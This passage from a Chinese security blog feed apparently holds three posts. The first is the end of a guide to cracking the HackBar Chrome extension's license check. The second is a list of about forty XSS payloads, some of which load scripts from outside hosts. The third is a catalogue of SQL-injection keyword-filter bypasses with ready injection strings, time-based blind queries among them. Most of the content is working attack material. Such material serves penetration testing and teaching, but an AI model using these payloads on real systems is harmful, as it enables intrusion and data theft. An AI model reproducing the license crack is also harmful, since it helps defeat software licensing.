            <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
            <span class="p">});</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// 证书不存在，直接禁用插件
</span><span class="c1"></span>        <span class="nx">disable_hackbar</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="p">........</span>
<span class="c1">// 证书检查函数
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">check_license</span><span class="p">(){</span>
    <span class="c1">// 检查 license_ok 标记
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">license_ok</span><span class="p">){</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Please input valid license!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="进行破解">进行破解</h3>
<p>通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点：</p>
<ul>
<li><code>license_ok</code> 一开始是 <code>true</code></li>
<li>证书检查失败的红框一开始是隐藏的</li>
<li>授权验证失败调用的是 <code>disable_hackbar()</code> 函数</li>
<li>只在一处地方会向 服务器 检查证书状况</li>
<li>其他地方都是通过 <code>check_license()</code> 也就是 <code>license_ok</code> 标记检查授权的</li>
</ul>
<p>也就是说，一共有两个关键点：</p>
<ol>
<li>证书检查失败的红框</li>
<li>功能的正常使用</li>
</ol>
<p>针对证书检查失败的红框，只需要 <code>disable_hackbar</code> 函数不运行 或者 里面去除<code>hidden</code>标记的代码不运行，就不会显示红框了</p>
<p>针对功能的正常使用，有很多办法可以达到：</p>
<ol>
<li>首先我们知道，这些功能都是在调用 <code>check_license()</code> 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉</li>
<li>我们还发现， <code>check_license()</code> 函数是通过 <code>license_ok</code> 标记检查授权的，所以我们可以在检查前将 <code>license_ok</code> 标记为 <code>true</code>，或者说将前面标记 <code>license_ok = false</code> 的代码注释掉</li>
</ol>
<p>最后我们发现，红框一开始是不显示的，<code>license_ok</code>一开始是<code>true</code>的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、<code>license_ok</code>为<code>false</code>，所以那段代码直接删除了就ok了</p>
<blockquote>
<p>我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解</p>
</blockquote>
<h2 id="插件安装">插件安装</h2>
<p>近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行</p>
<p>所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装</p>
<p>在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件</p>
<p>左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了</p>
<p></p>
<p>通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用</p>
<blockquote>
<p>当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布
这样所有人都可以安装了，当然推荐是 <strong>不公开</strong> 的发布模式</p>
</blockquote>
<p>安装后，按F12，插件就可以正常使用了</p>
<p></p>
<h2 id="总结">总结</h2>
<p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>
]]></description></item><item><title>xss payload</title><link>https://lgf.im/posts/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
<p>1.普通的XSS JavaScript注入</p>
<pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>2.IMG标签XSS使用JavaScript命令</p>
<pre><code>&lt;IMG SRC=1 ONERROR=alert('XSS')&gt;
</code></pre>
<p>3.IMG标签无分号无引号</p>
<pre><code>&lt;IMG SRC=javascript:alert('XSS')&gt;
</code></pre>
<p>4.IMG标签大小写不敏感</p>
<pre><code>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
</code></pre>
<p>5.HTML编码(必须有分号)</p>
<pre><code>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
</code></pre>
<p>6.修正缺陷IMG标签</p>
<pre><code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
</code></pre>
<p>7.formCharCode标签(计算器)</p>
<pre><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
</code></pre>
<p>8.UTF-8的Unicode编码(计算器)</p>
<pre><code>&lt;IMG SRC=jav..省略..S')&gt;
</code></pre>
<p>9.7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
<pre><code>&lt;IMG SRC=jav..省略..S')&gt;
</code></pre>
<p>10.十六进制编码也是没有分号(计算器)</p>
<pre><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
</code></pre>
<p>11.嵌入式标签,将Javascript分开</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>12.嵌入式编码标签,将Javascript分开</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>13.嵌入式换行符</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>14.嵌入式回车</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>15.嵌入式多行注入JavaScript,这是XSS极端的例子</p>
<pre><code>&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>16.解决限制字符(要求同页面)</p>
<pre><code>&lt;script&gt;z='document.'&lt;/script&gt;
&lt;script&gt;z=z+'write(&quot;'&lt;/script&gt;
&lt;script&gt;z=z+'&lt;script'&lt;/script&gt;
&lt;script&gt;z=z+' src=ht'&lt;/script&gt;
&lt;script&gt;z=z+'tp://ww'&lt;/script&gt;
&lt;script&gt;z=z+'w.shell'&lt;/script&gt;
&lt;script&gt;z=z+'.net/1.'&lt;/script&gt;
&lt;script&gt;z=z+'js&gt;&lt;/sc'&lt;/script&gt;
&lt;script&gt;z=z+'ript&gt;&quot;)'&lt;/script&gt;
&lt;script&gt;eval_r(z)&lt;/script&gt;
</code></pre>
<p>17.空字符</p>
<pre><code>perl -e 'print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;' &gt; out
</code></pre>
<p>18.空字符2,空字符在国内基本没效果.因为没有地方可以利用</p>
<pre><code>perl -e 'print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;' &gt; out
</code></pre>
<p>19.Spaces和meta前的IMG标签</p>
<pre><code>&lt;IMG SRC=&quot; javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>20.Non-alpha-non-digit XSS</p>
<pre><code>&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>21.Non-alpha-non-digit XSS to 2</p>
<pre><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
</code></pre>
<p>22.Non-alpha-non-digit XSS to 3</p>
<pre><code>&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>23.双开括号</p>
<pre><code>&lt;&lt;SCRIPT&gt;alert(a.sourse);//&lt;&lt;/SCRIPT&gt;
</code></pre>
<p>24.无结束脚本标记(仅火狐等浏览器)</p>
<pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;
</code></pre>
<p>25.无结束脚本标记</p>
<pre><code>&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;
</code></pre>
<p>26.半开的HTML/JavaScript XSS</p>
<pre><code>&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;
</code></pre>
<p>27.双开角括号</p>
<pre><code>&lt;iframe src=http://3w.org/XSS.html &gt;
</code></pre>
<p>28.无单引号、双引号、分号</p>
<pre><code>&lt;SCRIPT&gt;a=/XSS/ alert(a.source)&lt;/SCRIPT&gt;
</code></pre>
<p>29.换码过滤的JavaScript</p>
<pre><code>\&quot;;alert('XSS');//
</code></pre>
<p>30.结束Title标签</p>
<pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
</code></pre>
<p>31.Input Image</p>
<pre><code>&lt;INPUT SRC=&quot;javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>32.BODY Image</p>
<pre><code>&lt;BODY BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>33.BODY标签</p>
<pre><code>&lt;BODY('XSS')&gt;
</code></pre>
<p>34.IMG Dynsrc</p>
<pre><code>&lt;IMG DYNSRC=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>35.IMG Lowsrc</p>
<pre><code>&lt;IMG LOWSRC=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>36.BGSOUND</p>
<pre><code>&lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>37.STYLE sheet</p>
<pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>38.远程样式表</p>
<pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;
</code></pre>
<p>39.List-style-image(列表式)</p>
<pre><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
</code></pre>
<p>40.IMG VBscript</p>
<pre><code>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
<blockquote>
<p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法</p>
</blockquote>
<h2 id="过滤空格">过滤空格</h2>
<h3 id="使用注释符绕过">使用注释符<code>/**/</code>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="cm">/**/</span><span class="n">name</span><span class="cm">/**/</span><span class="k">FROM</span><span class="cm">/**/</span><span class="k">table</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用url编码绕过">使用<strong>url编码</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">%</span><span class="n">a0</span> <span class="err">发出去就是空格的意思，但是需要在</span><span class="n">burp中抓包后修改</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用浮点数绕过">使用<strong>浮点数</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">8</span><span class="n">E0union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
<span class="err">等价于</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用tab替代空格">使用<strong>Tab</strong>替代空格</h3>
<h3 id="使用两个空格替代一个空格">使用<strong>两个空格</strong>替代一个空格</h3>
<h3 id="使用括号绕过">使用<strong>括号</strong>绕过</h3>
<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="p">(</span><span class="k">user</span><span class="p">())</span><span class="k">from</span> <span class="n">dual</span> <span class="k">where</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="k">and</span><span class="p">(</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>这种过滤方法常常用于time based盲注,例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="k">and</span><span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">109</span><span class="p">))</span><span class="o">%</span><span class="mi">23</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤引号">过滤引号</h2>
<h3 id="使用16进制绕过">使用<strong>16进制</strong>绕过</h3>
<p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="k">column_name</span>  <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s2">&#34;users&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
<code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="k">column_name</span>  <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤逗号">过滤逗号</h2>
<h3 id="使用from关键字绕过">使用<strong>from关键字</strong>绕过</h3>
<p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">);</span>
<span class="k">select</span> <span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用join关键字绕过">使用<strong>join关键字</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span>
<span class="err">等价于</span>
<span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用like关键字绕过">使用<strong>like关键字</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">80</span>   <span class="o">#</span><span class="err">等价于</span>
<span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">like</span> <span class="s1">&#39;r%&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用offset关键字绕过">使用<strong>offset关键字</strong>绕过</h3>
<p>对于limit可以使用offset来绕过：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
<span class="err">等价于</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">0</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤注释符--和----">过滤注释符（ <code>#</code> 和 <code>--</code> ）</h2>
<h3 id="手动闭合引号不使用注释符">手动闭合引号，不使用注释符</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3||&#39;</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><p>或者：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,&#39;</span><span class="mi">3</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤比较符号---和--">过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h2>
<h3 id="使用greatestleast函数绕过">使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3>
<p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
<p>最常见的一个盲注的sql语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">64</span>
</code></pre></td></tr></table>
</div>
</div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,&hellip;)函数返回输入参数(n1,n2,n3,&hellip;)的最大值</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">greatest</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">64</span><span class="p">)</span><span class="o">=</span><span class="mi">64</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用between-and绕过">使用**<code>between</code> <code>and</code>**绕过</h3>
<p>between a and b：返回a，b之间的数据，不包含b。</p>
<h2 id="过滤等号--">过滤等号（ <code>=</code> ）</h2>
<h3 id="使用like-rlike-regexp-或者-使用-或者-">使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</h3>
<h2 id="过滤or-and-xor-not">过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2>
<h3 id="使用符号代替">使用符号代替</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">and</span><span class="o">=`&amp;&amp;`</span>  <span class="k">or</span><span class="o">=`||`</span>   <span class="n">xor</span><span class="o">=`|`</span>   <span class="k">not</span><span class="o">=`!`</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤unionselectwhere等">过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2>
<h3 id="使用注释符绕过-1">使用<strong>注释符</strong>绕过</h3>
<p>常用注释符：</p>
<p><code>//</code>、<code>--</code>、<code>/**/</code>、<code>#</code>、<code>--+</code>、<code>---</code>、<code>;</code>、<code>%00</code>、<code>--a</code></p>
<p>用法：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">U</span><span class="cm">/**/</span> <span class="n">NION</span> <span class="cm">/**/</span> <span class="n">SE</span><span class="cm">/**/</span> <span class="n">LECT</span> <span class="cm">/**/</span><span class="k">user</span><span class="err">，</span><span class="n">pwd</span> <span class="k">from</span> <span class="k">user</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用大小写绕过">使用<strong>大小写</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UnIoN/**/SeLeCT
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用内联注释绕过">使用<strong>内联注释</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用双关键字绕过若删除掉第一个匹配的union就能绕过">使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UNIunionONSeLselectECT1,2,3–-
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用加号拆解字符串">使用<strong>加号+拆解字符串</strong></h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">or</span> <span class="err">‘</span><span class="n">swords</span><span class="err">’</span> <span class="o">=</span><span class="err">‘</span><span class="n">sw</span><span class="err">’</span> <span class="o">+</span><span class="err">’</span> <span class="n">ords</span><span class="err">’</span> <span class="err">；</span><span class="k">EXEC</span><span class="p">(</span><span class="err">‘</span><span class="k">IN</span><span class="err">’</span> <span class="o">+</span><span class="err">’</span> <span class="n">SERT</span> <span class="k">INTO</span> <span class="err">‘</span><span class="o">+</span><span class="err">’</span> <span class="err">…</span><span class="p">..</span><span class="err">’</span> <span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用语法新特性绕过屏蔽select">使用语法新特性绕过屏蔽select</h3>
<p>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p>
<h4 id="table-语句">TABLE 语句</h4>
<p>可以直接列出表的全部内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">TABLE</span> <span class="k">table_name</span> <span class="p">[</span><span class="k">ORDER</span> <span class="k">BY</span> <span class="k">column_name</span><span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="nb">number</span> <span class="p">[</span><span class="k">OFFSET</span> <span class="nb">number</span><span class="p">]]</span>
</code></pre></td></tr></table>
</div>
</div><p>如 <code>select * from user</code> 就可以用 <code>table user</code> 替代来进行绕过</p>
<h4 id="values-语句">VALUES 语句</h4>
<p>可以列出一行的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">VALUES</span> <span class="n">row_constructor_list</span> <span class="p">[</span><span class="k">ORDER</span> <span class="k">BY</span> <span class="n">column_designator</span><span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="k">BY</span> <span class="nb">number</span><span class="p">]</span>

<span class="n">row_constructor_list</span><span class="p">:</span>
 <span class="k">ROW</span><span class="p">(</span><span class="n">value_list</span><span class="p">)[,</span> <span class="k">ROW</span><span class="p">(</span><span class="n">value_list</span><span class="p">)][,</span> <span class="p">...]</span>

<span class="n">value_list</span><span class="p">:</span>
 <span class="n">value</span><span class="p">[,</span> <span class="n">value</span><span class="p">][,</span> <span class="p">...]</span>

<span class="n">column_designator</span><span class="p">:</span>
 <span class="n">column_index</span>
</code></pre></td></tr></table>
</div>
</div><p>例如直接列出一行的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">VALUES</span> <span class="k">ROW</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="k">ROW</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
